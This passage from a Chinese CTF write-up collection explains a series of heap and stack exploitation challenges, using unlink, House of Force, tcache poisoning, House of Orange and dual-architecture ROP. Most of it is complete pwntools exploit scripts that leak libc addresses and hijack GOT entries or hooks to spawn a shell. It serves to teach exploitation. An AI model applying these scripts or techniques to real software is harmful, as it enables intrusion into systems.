通过逆向可知结构体偏移 0 处是打印函数、偏移 4 处是释放函数，释放函数的参数是结构体指针本身。那么我们将 `chunk0` 的打印函数写成 `sh\x00\x00`（注意 4 字节），释放函数用 `system` 覆盖，释放时就会执行 `system("sh")`。

```python
def add(index,len,content='a'):
    sla('CNote> ','1')
    sla('Index> ',str(index))
    sla('Type> ','2')
    sla('Length> ',str(len))
    sla('Value> ',content)

def delete(index):
    sla('CNote> ','2')
    sla('Index> ',str(index))

add(0,0x10)
add(1,0x10)
delete(0)
delete(1)
add(2,0xc,'sh\x00\x00'+p32(elf.sym['system']))
# 0xc from 1, then 0xc from 0
delete(0)
```

### hitcon2014_stkof

本题共四个功能：添加、读入内容、删除、显示。其中读入内容存在堆溢出，我们可以利用这个溢出实现 unlink 攻击。程序中存在全局数组 `bag`，存放所有 chunk 的 mem 指针。

先申请 3 个 chunk，其中第 1 个 chunk 没有用，只是因为前两个 chunk 不连续所以才申请的。随后通过 chunk2 溢出到 chunk3 进行 unlink 攻击，这样修改 `bag[2]` 等价于修改 `bag[-1]`，填充掉 `bag[-1]` 和 `bag[0]` 后，令：

- `bag[1] = elf.got['free']`
- `bag[2] = elf.got['fflush']`，`fflush` 可以是任意已调用的 libc 函数
- `bag[3] = elf.got['atoi']`

此时我们 `edit(1)` 写入 `elf.plt['puts']` 即可劫持 `free` 函数到 `puts`，那么调用 `delete(2)` 就会打印出 `fflush` 地址，从而泄露 libc。最后 `edit(3)` 写入 `system` 地址，劫持 `atoi` 到 `system`，这是因为在程序读入指令时会调用 `atoi(&nptr)`，我们输入的 `nptr` 只需要是 `/bin/sh` 即可 getshell。

```python
def add(size):
    sl('1')
    sl(str(size))
    ru('OK\n')

def delete(index):
    sl('3')
    sl(str(index))

def edit(index,content):
    sl('2')
    sl(str(index))
    sl(str(len(content)))
    s(content)
    ru('OK\n')

bag = 0x602140

add(0x80)
add(0x80)
add(0x80)
fd = bag+0x10-0x18
bk = bag+0x10-0x10
payload = flat(0,0x80,fd,bk).ljust(0x80,'a')
payload += flat(0x80,0x90)
edit(2,payload)
delete(3)

# bag[2] <-> bag[-1]
payload = flat('a'*0x10,elf.got['free'],elf.got['fflush'],elf.got['atoi'])
edit(2,payload)
edit(1,p64(elf.plt['puts']))
delete(2) # puts(GOT[fflush])
ru('OK\n')
fflush = uu64(r(6))
leak('fflush',fflush)
system,binsh = ret2libc(fflush,'fflush')
edit(3,p64(system))
sl('/bin/sh\x00')
```

## Part III

### sleepyHolder_hitcon_2016

这道题允许保存 small/big/huge secret，其中 huge 只能保存一次，不能删除和修改，并且在保存了一个 small/big 之后就不能再保存新的 small/big 了，只能 renew。

显然这个 huge 就是我们漏洞利用的核心。实际上，huge 的范围属于 large bin，在申请这么大的 chunk 时如果 unsorted bin 中没有满足条件的，就会触发 `malloc_consolidate()`，使 fastbin 中的 chunk 合并进入 unsorted bin，最终根据合并后的大小进入 small bin 或 large bin。那么我们不妨先申请一个 small，然后申请 big 防止 small 被释放时与 top chunk 合并，再释放 small。此时 small 进入 fastbin，再申请 huge 即可让 small 进入到 small bin。

由于这时 small 已经不处于 fastbin 链表头了，所以再次释放并不会出错，造成 double free。这样之后在 small 内伪造 chunk 并 unlink 劫持 GOT 表即可。

```python
add(1)
add(2)
delete(1) # 1->fastbin
add(3) # consolidate,1->unsorted bin->smallbin
delete(1)

small_secret = 0x6020d0
fd = small_secret - 0x18
bk = small_secret - 0x10
payload = flat(0,0x21,fd,bk,0x20)
add(1,payload)
delete(2)

# ?,big,huge,small,big_flag,huge_flag,small_flag
payload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3
edit(1,payload)
edit(1,p64(elf.plt['puts'])) # free -> puts
delete(2)
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(1,p64(system))
add(2,'/bin/sh\x00')
delete(2)
```

### secretHolder_hitcon_2016

类似上一题，不过 huge 可以修改和删除了。由于 huge 非常大，分配时会调用 `mmap()`，但是当释放掉 huge 再申请时，`mmap_threshold` 已经变得和 huge 一样大，此时分配 huge 使用的是 `brk()`，因此 huge 被分配到了堆上。

利用这个特性，我们可以先令 small 和 huge 地址重合，随后在下面垫上 big。在 small 里伪造堆块并释放 big，触发 unlink，剩余的工作就和上一题一模一样了。

```python
def add(type,content='a'):
    sla('Renew secret\n','1')
    sla('Huge secret\n',str(type))
    sa(': \n',content)
def delete(type):
    sla('Renew secret\n','2')
    sla('Huge secret\n',str(type))
def edit(type,content):
    sla('Renew secret\n','3')
    sla('Huge secret',str(type))
    sa(': \n',content)

add(1)
add(2)
delete(1)
delete(2)
add(3)
delete(3) # mmap threshold +++
add(3) # brk()
delete(1)
add(1) # small <-> huge
add(2)

small = 0x6020b0
fd = small-0x18
bk = small-0x10
payload = flat(0,0x21,fd,bk,0x20,0x90,'a'*0x80)
payload += flat(0,0x21,'a'*0x10,0,0x21)
edit(3,payload)
delete(2)

# ?,big,huge,small,big_flag,huge_flag,small_flag
payload = flat(0,elf.got['atoi'],elf.got['puts'],elf.got['free']) + p32(1)*3
edit(1,payload)
edit(1,p64(elf.plt['puts'])) # free -> puts
delete(2)
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(1,p64(system))
add(2,'/bin/sh\x00')
delete(2)
```

### bcloud_bctf_2016

在读入名字和读入 Org 以及 Host 时，均存在同样的 `strcpy` 漏洞，前者导致泄露堆地址，而后者允许我们 off-by-one 修改 top chunk 的大小，从而实现 House of Force。通过 gdb 调试得到 `top_chunk = heap + 0xd0`，那么构造的 `evil_size` 就是我们想分配到的 `note_len` 数组地址减去 header 的 0x8，减去 `old_top_chunk` 地址，再减去 12，这是因为已经分配了三个堆块，在程序中每个堆块额外分配了 4B。最后从 `note_len` 覆盖到 `note` 数组，劫持 `free` 到 `printf` 泄露 libc，再劫持 `atoi` 到 `system`。

```python
def add(len,content='a'):
    sla('>>\n','1')
    sla(':\n',str(len))
    sa(':\n',content)
def delete(index):
    sla('>>\n','4')
    sla(':\n',str(index))
def edit(index,content):
    sla('>>\n','3')
    sla(':\n',str(index))
    sla(':\n',content)

sa('name:\n','a'*0x40)
ru('a'*0x40)
heap = uu32(r(4))
leak('heap',heap)

sa('Org:\n','a'*0x40)
sla('Host:\n',p32(0xffffffff))

note_len = 0x804b0a0
note = 0x804b120
top_chunk = heap + 0xd0
evil_size = note_len-0x8-top_chunk-0xc # gdb
add(evil_size,'')
payload = flat((note-note_len)*'a',elf.got['atoi'],elf.got['free'],elf.got['atoi'])
add(len(payload),payload)
edit(1,p32(elf.plt['printf']))
delete(0) # printf(atoi.got)
atoi = uu32(r(4))
system,binsh = ret2libc(atoi,'atoi')
edit(2,p32(system))
sla('>>\n','/bin/sh\x00')
```

### lctf2016_pwn200

首先不难发现读入 `name` 时存在 off-by-one，可以借此泄露栈地址。为了后面 ret2shellcode，我们可以先在 `name` 里顺便写好 shellcode：

```python
payload = asm(shellcraft.sh()).ljust(48,'a')
sa('u?\n',payload)
ru(payload)
rbp = uu64(ru(', w',True))
leak('rbp',rbp)
```

而读入 `money` 时，恰好可以覆盖到堆指针 `dest`。那么可以覆盖 `dest` 为我们伪造的 chunk，同时准备好 `id`（只需要大于 0x10 小于 0x21000 即可）作为 `nextsize`，这样就可以先释放再申请这个 fake chunk，就可以控制 rip 了，最后覆盖 rip 为 shellcode 地址。

通过 gdb 调试，可以绘制大致的栈结构图：

```
 ------------ <- leaked rbp
|            | 0x20
 ------------ <- rbp
| shellcode  | 0x30
 ------------ <- shellcode_addr  --
| 0x20       | id                 |
 ------------                     |
|            |                    |
 ------------                     |
| rip        |                    | 0x40
 ------------                     |
| rbp        |                    |
 ------------                     |
| dest       |                    |
 ------------ <- fake            --
| 0x41       |
 ------------
| prev_size  |
 ------------
| ...        |
```

由此可以得到：

```python
sc = rbp-0x50
fake = rbp-0x90
```

从而伪造堆块：

```python
sla('id ~~?\n',str(0x20))
sa('money~\n',p64(0)*4+flat(0,0x41,0,fake))

sla('choice :','2') # free
sla('choice :','1') # malloc
sla('long?',str(0x30)) # + 0x10 = 0x40
ru('48')
sl(flat('a'*0x18,sc))
sla('choice :','3')
```

### zctf2016_note2

添加 note 时，存在整数溢出漏洞，导致添加大小为 0 的 note，可以输入的长度为无符号的 `-1`，可以认为没有限制，但是 `malloc` 依旧会分配 `0x20` 字节。利用这个堆溢出，我们先分配三个 chunk：

```
| ...               |               |
 -------------------                |
| 'a'*8             |               |
 ------------------- <- ptr[2]    chunk2
| size=0x91         |               |
 -------------------                |
| prev_size         |               |
 ------------------- <---------------
|                   |               |
 -------------------                |
| 'a'*8             |               |
 ------------------- <- ptr[1]    chunk1
| size=0x20         |               |
 -------------------                |
| prev_size         |               |
 ------------------- <---------------
|                   | 0x18          |
 -------------------                |
| bp_prev_size=0x60 |               |
 -------------------                |
| 'a'*0x40          | 0x40          |
 -------------------                |
| fd     | bk       | 0x10          |
 -------------------              chunk0
| fake_size=0x61    |               |
 -------------------                |
| fake_prev_size=0  |               |
 ------------------- <- ptr[0]      |
| size=0x91         |               |
 -------------------                |
| prev_size         |               |
 ------------------- <---------------
```

我们在 0x80 的 `chunk0` 内伪造了 0x61 的 chunk，并通过 `bp_prev_size=0x60` 确保能通过检查。随后分配大小为 `0` 的 `chunk1`（实际大小为 0x20），由于整数溢出这里可以输入无限长度的内容，最后分配 0x80 的 `chunk2` 用来引起 `unlink`。

接下来释放 1 再拿回来，就可以溢出到 `chunk2`，修改其 `prev_size` 和 `chunk_size`，前者修改为 `0x20+0x80=0xa0`，后者置 `PREV_IN_USE` 位为 `0`。这样再释放 2 就可以 `unlink` 掉我们的 fake chunk 了。此时 `ptr` 指向 `ptr-0x18`，填充 0x18 字节后即可修改 `ptr[0]`，之后就是常规 GOT 劫持了。

```python
def add(len,content='a'*8):
    sla('>>','1')
    sla('128)',str(len))
    sla('content:',content)

def show(index):
    sla('>>','2')
    sla('note:',str(index))

def edit(index,choice,content):
    sla('>>','3')
    sla('note:',str(index))
    sla(']',str(choice))
    sl(content)

def delete(index):
    sla('>>','4')
    sla('note:',str(index))

sla('name:','merc')
sla('address:','privacy')

ptr = 0x602120
fd = ptr-0x18
bk = ptr-0x10
payload = flat('a'*8,0x61,fd,bk,'a'*0x40,0x60)
add(0x80,payload) # 0
add(0) # 1,0x20
add(0x80) # 2

delete(1)
# padding,prev_size=0x20+0x80,PREV_IN_USE=0
add(0,flat('a'*0x10,0xa0,0x90))
delete(2)

payload = flat('a'*0x18,elf.got['atoi'])
edit(0,1,payload)
show(0)
ru('is')
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(0,1,p64(system))
sla('>>','/bin/sh\x00')
```

### zctf2016_note3

这题和上题类似，不过 bss 结构大致如下：

```
current_ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
```

本题漏洞在于 `edit` 时会判断输入的长度是否小于 0，如果是就取相反数。但是可以通过整数溢出，输入 `0x8000000000000000`，它的相反数恰好是它自身，并且依然是一个负数（-1）。这样就造成数组越界，可以覆盖到 `current_ptr`。

我们的思路是先让 `current_ptr` 指向 `note3`，然后利用越界覆盖一个 `fake_chunk` 到 `note3` 上，再释放 `note4` 触发 unlink，此时 `note3_ptr` 指向 `note0_ptr`，这样就可以实现 GOT 劫持。

但是本题的 `show` 功能被禁用，而我们还需要泄露 libc 地址。这里用的方法是在 bss 段空余处写入 `%llx.`，然后把 `free` 先劫持到 `printf`，去打印这一段格式化字符串，相当于手动造了一个格式化字符串漏洞。这样就可以泄露栈上内容，从而泄露位于栈上的 `__libc_start_main_ret` 地址（一般位于偏移量 11 处）。最后泄露 libc 得到 `system` 地址，覆盖 `atoi` 即可。

```python
def add(len,content='a'*8):
    sla('>>','1')
    sla('1024)',str(len))
    sla('content:',content)

def show(index):
    sla('>>','2')
    sla('note:',str(index))

def edit(index,content):
    sla('>>','3')
    sla('note:',str(index))
    sla('content:',content)

def delete(index):
    sla('>>','4')
    sla('note:',str(index))

negative = 0x8000000000000000
for i in range(8):
    add(0x200)
edit(3,'a')
fd = 0x6020c8+0x8*3-0x18
bk = 0x6020c8+0x8*3-0x10
fake_chunk = flat(0,0x201,fd,bk).ljust(0x200,'a')
fake_chunk += flat(0x200,0x210)
edit(-negative,fake_chunk)
delete(4)

edit(3,p64(elf.got['free']))
edit(0,p64(elf.plt['printf'])*2)

bss_blank = 0x602100
edit(3,p64(bss_blank))
edit(0,'%llx.'*0x10)
delete(0)
lsmr = int(ru('success').split('.')[10],16)
system,binsh = ret2libc(lsmr,'__libc_start_main_ret')
edit(3,p64(elf.got['atoi']))
edit(0,p64(system))

sla('>>','/bin/sh\x00')
```

### 0ctf_2018_heapstorm2

分析先咕了，等完全理解了再补充。先放一些参考的 wp：

- [wp1](http://eternalsakura13.com/2018/04/03/heapstorm2/)
- [wp2](https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/)
- [wp3](https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md)

```python
def add(size):
    sl('1')
    ru('Size:')
    sl('%d' % size)
    ru('Command:')

def edit(index, content):
    sl('2')
    sla('Index:',str(index))
    sla('Size:', str(len(content)))
    sa('Content:',content)
    ru('Command:')

def free(index):
    sl('3')
    sla('Index:',str(index))
    ru('Command:')

def show(index):
    sl('4')
    sla('Index:', str(index))
    m = ru('Command:')
    pos1 = m.find(']: ') + len(']: ')
    pos2 = m.find('\n1.')
    return m[pos1:pos2]

add(0x18) # 0
add(0x508) # 1
add(0x18) # 2
edit(1,flat('a'*0x4f0,0x500))

add(0x18) # 3
add(0x508) # 4
add(0x18) # 5
edit(4,flat('a'*0x4f0,0x500))
add(0x18) # 6

free(1)
edit(0,'a'*(0x18-12))
add(0x18) # 1
add(0x4d8) # 7
free(1)
free(2)
add(0x38) # 1
add(0x4e8) # 2

free(4)
edit(3,'a'*(0x18-12))
add(0x18) # 4
add(0x4d8) # 8
free(4)
free(5)
add(0x48) # 4

free(2)
add(0x4e8) # 2
free(2)

storage = 0x13370800
fake = storage-0x20

payload = flat(0,0,0,0x4f1,0,fake)
edit(7,payload)
payload = flat(0,0,0,0,0,0x4e1,0,fake+8,0,fake-0x18-5)
edit(8,payload)

try:
    add(0x48)
except:
    print('Try again?')

payload = flat(0,0,0,0,0,0x13377331,storage)
edit(2,payload)

payload = flat(0,0,0,0x13377331,storage,0x1000)
p1 = payload + flat(storage-0x20+3,8)
edit(0,p1)

heap = uu64(show(1))
p2 = payload + flat(heap+0x10,8)
edit(0,p2)

base = uu64(show(1))-88-libc.sym['__malloc_hook']-0x10
system = base + libc.sym['system']
free_hook = base + libc.sym['__free_hook']

p3 = payload + flat(free_hook,0x100,storage+0x50,0x100,'/bin/sh\x00')
edit(0,p3)
edit(1,p64(system))

sl('3')
sla('Index:','2')
```

### houseoforange_hitcon_2016

```
pwndbg> p *(struct _IO_FILE*)0x555b7d04b4f0
$2 = {
  _flags = 1852400175,
  _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>,
  _IO_read_end = 0x0,
  _IO_read_base = 0x7f29a0f30510 "",
  _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>,
  _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x0,
  _IO_buf_end = 0x0,
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0,
  _flags2 = 0,
  _old_offset = 0,
  _cur_column = 0,
  _vtable_offset = 0 '\000',
  _shortbuf = "",
  _lock = 0x0,
  _offset = 0,
  _codecvt = 0x0,
  _wide_data = 0x0,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0,
  _mode = 0,
  _unused2 = '\000' <repeats 19 times>
}
```

```python
def add(size):
    sla('choice :','1')
    sla(":",str(size))
    sa(':','a'*8)
    sla(':','1')
    sla(':','1')

def show():
    sla('choice :','2')

def edit(size,name):
    sla('choice :','3')
    sla(":",str(size))
    sa(':',name)
    sla(':','1')
    sla(':','1')

add(0x18)
useless = flat(0,0x21,0x1f00000001,0)
payload = 'a'*0x10 + useless + flat(0,0xfa1)
edit(0x40,payload) # corrupt top chunk

add(0x1000) # old_top -> unsorted
add(0x400) # slice old top
show()
ru('a'*8)
base = uu64(ru('\n'))-1640-libc.sym['__malloc_hook']-0x10
leak('base',base)
system = base + libc.sym['system']
io_list_all = base + libc.sym['_IO_list_all']

'''large chunk:
0x56512e53b0c0:    0x0000000000000000 0x0000000000000411
0x56512e53b0d0:    0x6161616161616161    0x00007f01ea979188
0x56512e53b0e0:    0x000056512e53b0c0    0x000056512e53b0c0
'''
edit(0x10,'a'*0x10)
show()
ru('a'*0x10)
heap = uu64(ru('\n')) - 0xc0
leak('heap',heap)

# jump_table+0x18
payload = flat(0,0,0,system).ljust(0x400,'\x00')
# _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable
payload += useless + flat('/bin/sh\x00',0x61,0,io_list_all-0x10,2,3,'\x00'*(0xd8-0x30),heap+0xd0)
edit(0x1000,payload)

sla('choice :','1')
```

### ciscn_2019_final_2

本题需要将读入的 `flag` 的 `fd` 改为 666。

存在 tcache double free 漏洞，首先分配多个 `short`，利用 double free 泄露堆地址。然后 tcache 投毒，伪造 `chunk0` 大小，并释放进入 unsorted bin 泄露 libc。注意释放前先填满 tcache 才能进入 unsorted bin。

接下来继续投毒使 `int` 的 `fd` 指向 `fileno`，再次 double free 泄露 `chunk0` 的 `mem` 指针地址。最后投毒指向 `chunk0` 的 `mem` 指针地址，再申请三次就可以修改 `fileno` 了。

```python
add(1,0x30)
free(1)
add(2,0x20)
add(2,0x20)
add(2,0x20) # total size: 0x90
add(2,0x20) # prevent merging
free(2)
add(1,0x30)
free(2)
show(2)
ru('number :')
chunk0 = int(ru('\n'))-0xa0
leak('chunk0',chunk0)
add(2,chunk0) # poisoning
add(2,0xdeadbeef)
add(2,0x91) # chunk0

for i in range(7): # fill tcache
    free(1)
    add(2,0x20)
free(1) # unsorted
show(1)
ru('number :')

base = int(ru('\n'))-96-libc.sym['__malloc_hook']-0x10
leak('base',base)
fileno = base+libc.sym['_IO_2_1_stdin_']+0x70

add(1,fileno) # poisoning
add(1,0x30)
free(1)
add(2,0x20)
free(1)
show(1)
ru('number :')
chunk0_mem = int(ru('\n'))-0x30

add(1,chunk0_mem) # poisoning
add(1,0xdeadbeef)
add(1,0xdeadbeef)
add(1,666)

sla('>',4)
```

### 强网杯\_拟态\_stkof

采用了拟态防御，简单来说就是要用同一个脚本同时在 32 位和 64 位程序上 getshell 且两个程序的输出必须相同。

首先检查两个二进制文件，漏洞都是简单的栈溢出并且空间很大。区别在于可以溢出的长度相差 8 字节，这 8 字节应该就是能够用同一个脚本的关键所在。

容易想到利用常规 ret2syscall，分别写出 32 位和 64 位脚本：

```python
pop_eax = 0x80a8af6
pop_dcb = 0x806e9f1
int_80 = 0x80495a3
data = 0x80d7000

chain86 = [
    'a'*(0x10c+4),
    elf.sym['read'],
    pop_dcb,0,data,0x100,
    pop_dcb,0,0,data,
    pop_eax,0xb,
    int_80
]

payload = flat(chain86)
sa('?',payload)
s('/bin/sh\x00')
```

```python
pop_rax = 0x43b97c
pop_rdi = 0x4005f6
pop_rsi = 0x405895
pop_rdx = 0x43b9d5
syscall = 0x461645
data = 0x6a4e40

chain64 = [
    'a'*(0x110+8),
    pop_rax,0,pop_rdi,0,
    pop_rsi,data,pop_rdx,0x100,
    syscall,
    pop_rax,59,pop_rdi,data,
    pop_rsi,0,pop_rdx,0,
    syscall
]

payload = flat(chain64)
sa('?',payload)
s('/bin/sh\x00')
```

那么怎么把两者合并呢？这就需要用到 8 字节的栈溢出长度差，在这 8 字节中，我们分别调整 32 位程序和 64 位程序的 `esp` 和 `rsp` 指针，使得经过调整后栈上的返回地址指向 payload 的不同部分。

这里需要注意的是，栈变量在 32 位下位于 `esp+0xc`，在 64 位下位于 `rsp+0x0`，在计算需要填充的 padding 时需要考虑到这一点。

```python
pop_eax = 0x80a8af6
pop_dcb = 0x806e9f1
int_80 = 0x80495a3
data86 = 0x80d7000
read = 0x806c8e0
add_esp_20 = 0x80a69f2

offset86 = 0x20-0xc # esp+0xc
chain86 = [
    'a'*offset86,
    read,
    pop_dcb,0,data86,0x8,
    pop_dcb,0,0,data86,
    pop_eax,0xb,
    int_80
]
payload86 = flat(chain86,word_size=32)

pop_rax = 0x43b97c
pop_rdi = 0x4005f6
pop_rsi = 0x405895
pop_rdx = 0x43b9d5
syscall = 0x461645
data64 = 0x6a4e40
add_rsp_80 = 0x40cd17

offset64 = 0x80-len(payload86) # rsp+0x0
print hex(offset64)
chain64 = [
    'a'*offset64,
    pop_rax,0,pop_rdi,0,
    pop_rsi,data64,pop_rdx,0x100,
    syscall,
    pop_rax,59,pop_rdi,data64,
    pop_rsi,0,pop_rdx,0,
    syscall
]
payload64 = flat(chain64,word_size=64)

payload = 'a'*0x110 + (p32(add_esp_20)+'aaaa') + p64(add_rsp_80) + payload86 + payload64

sa('?',payload)
s('/bin/sh\x00')
```

### axb_2019_heap

利用格式化字符串漏洞泄露堆地址和 libc。随后，可以发现 `edit` 时存在 off by one，我们在构造 unlink 的 fake chunk 时，该漏洞会导致修改下一个 chunk 的 `prev_size` 后会覆盖掉它的 `size` 字段最后一个字节。但是同样的，我们也可以利用该漏洞手动恢复最后一个字节。，这里是 `0xa0`。

接下来就常规 unlink，覆盖 `free_hook` 为 `system`，注意维持原 `note` 数组结构。

```python
sla('name:','%11$p.%15$p')
ru(',')
heap = int(ru('.'),16)-0x1186
base = int(ru('\n'),16)-0x20830
leak('heap',heap)
leak('base',base)

note = heap+0x202060
system = base+libc.sym['system']
free_hook = base+libc.sym['__free_hook']

add(0,0x98)
add(1,0x98)
add(2,0x90)
add(3,0x90,'/bin/sh\x00')

fd = note-0x18
bk = note-0x10
fake = flat(0,0x91,fd,bk).ljust(0x90,'\x00') + p64(0x90)+'\xa0'
edit(0,fake)
free(1)

edit(0,flat(0,0,0,free_hook,0x98))
edit(0,p64(system))
free(3)
```
